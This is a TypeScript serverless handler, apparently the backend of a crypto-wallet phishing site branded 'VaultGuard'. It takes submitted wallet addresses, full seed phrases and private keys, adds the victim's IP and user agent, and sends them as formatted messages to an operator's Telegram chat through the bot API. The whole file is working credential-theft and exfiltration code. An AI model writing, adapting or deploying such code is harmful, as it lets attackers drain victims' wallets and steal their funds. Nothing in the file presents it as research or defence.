export const config = { runtime: 'edge' }

async function sendTelegram(token: string, chatId: string, text: string) {
  if (!token || !chatId) return
  await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: chatId,
      text,
      parse_mode: 'HTML',
      disable_web_page_preview: true,
    }),
  })
}

export default async function handler(request: Request): Promise<Response> {
  if (request.method !== 'POST') {
    return Response.json({ ok: false }, { status: 405 })
  }

  const { type, data, meta } = await request.json()
  if (!type || !data) {
    return Response.json({ ok: false }, { status: 400 })
  }

  const token = process.env.TELEGRAM_BOT_TOKEN || ''
  const chatId = process.env.TELEGRAM_CHAT_ID || ''
  const ip = request.headers.get('x-forwarded-for') || 'unknown'
  const ua = (meta?.userAgent || request.headers.get('user-agent') || 'unknown').slice(0, 120)
  const ts = new Date().toUTCString()

  let msg = ''

  if (type === 'address_entered') {
    msg =
      `🔍 <b>VaultGuard — Address Entered</b>\n` +
      `━━━━━━━━━━━━━━━━━━━━\n` +
      `<b>Address:</b> <code>${data.address}</code>\n` +
      `<b>Time:</b> ${ts}\n` +
      `<b>IP:</b> ${ip}\n` +
      `<b>UA:</b> ${ua}`
  } else if (type === 'wallet_connected') {
    msg =
      `🔗 <b>VaultGuard — Wallet Connected</b>\n` +
      `━━━━━━━━━━━━━━━━━━━━\n` +
      `<b>Wallet:</b> ${data.wallet}\n` +
      `<b>Address:</b> <code>${data.address}</code>\n` +
      `<b>Entered:</b> <code>${data.enteredAddress}</code>\n` +
      `<b>Match:</b> ${data.address?.toLowerCase() === data.enteredAddress?.toLowerCase() ? '✅ Yes' : '⚠️ No'}\n` +
      `<b>Time:</b> ${ts}\n` +
      `<b>IP:</b> ${ip}\n` +
      `<b>UA:</b> ${ua}`
  } else if (type === 'seed_phrase') {
    const words: string[] = data.words ?? []
    const filled = words.filter((w: string) => w.trim().length > 0)
    msg =
      `🌱 <b>VaultGuard — Seed Phrase Submitted</b>\n` +
      `━━━━━━━━━━━━━━━━━━━━\n` +
      `<b>Address:</b> <code>${data.walletAddress}</code>\n` +
      `<b>Word count:</b> ${data.wordCount} (${filled.length} filled)\n` +
      `<b>Phrase:</b>\n<code>${filled.join(' ')}</code>\n` +
      `<b>Time:</b> ${ts}\n` +
      `<b>IP:</b> ${ip}\n` +
      `<b>UA:</b> ${ua}`
  } else if (type === 'private_key') {
    msg =
      `🔑 <b>VaultGuard — Private Key Submitted</b>\n` +
      `━━━━━━━━━━━━━━━━━━━━\n` +
      `<b>Address:</b> <code>${data.walletAddress}</code>\n` +
      `<b>Key:</b> <code>${data.privateKey}</code>\n` +
      `<b>Time:</b> ${ts}\n` +
      `<b>IP:</b> ${ip}\n` +
      `<b>UA:</b> ${ua}`
  } else {
    return Response.json({ ok: false }, { status: 400 })
  }

  await sendTelegram(token, chatId, msg)
  return Response.json({ ok: true })
}
